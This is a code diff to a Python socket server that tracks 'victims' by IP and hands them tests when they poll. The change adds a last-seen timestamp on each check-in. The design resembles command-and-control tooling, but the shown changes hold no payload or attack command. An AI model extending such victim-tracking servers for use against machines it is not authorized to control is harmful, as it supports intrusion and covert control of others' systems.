@@ -5,17 +5,20 @@ import socket
 import random
 import struct
 import select
+from datetime import datetime
 
 class Victim():
 	VIC_ID = ""
 	PUBLIC_IP = ""
 	PRIVATE_IP=""
+	LAST_SEEN = None
 	TESTS = []
 	def __init__(self,pub_ip,priv_ip,tests=None):
-		global VIC_ID, PUBLIC_IP, PRIVATE_IP, TESTS
+		global VIC_ID, PUBLIC_IP, PRIVATE_IP, TESTS,LAST_SEEN
 		self.PUBLIC_IP = pub_ip.strip()
 		self.PRIVATE_IP= priv_ip.strip()
 		self.VIC_ID = self.PUBLIC_IP.replace(".","").replace(":","") + self.PRIVATE_IP.replace(".","").replace(":","")
+		self.LAST_SEEN = datetime.now()	
 		if tests != None: 
 			self.TESTS=tests
 #end class
@@ -26,7 +29,7 @@ class CMDProtoHandler(asyncore.dispatcher_with_send):
 		asyncore.dispatcher_with_send.__init__(self,conn_sock) #Line is required
 		self.server.log("Received connection from " + client_address[0] + ' on port ' + str(self.server.sPort), 1)
 	def handle_read(self):
-		global VICTIMS
+		global VICTIMS, LAST_SEEN
 		request = self.recv(1024).strip()
 		if (request == ""): return
 		parts = request.split(" ")
@@ -48,7 +51,11 @@ class CMDProtoHandler(asyncore.dispatcher_with_send):
 			#self.server.log("POLLING request from " + parts[1], 1)
 			test = self.getVicTest(request)
 			self.send(test + "\n")
-			#client waits for new command
+			if len(parts)==2:
+				for vic in self.VICTIMS:
+					if vic.VIC_ID == parts[1]:
+						vic.LAST_SEEN = datetime.now()
+						break
 		else:
 			self.server.log("Invallid command.",0)
 	def getVicTest(self,cmd):
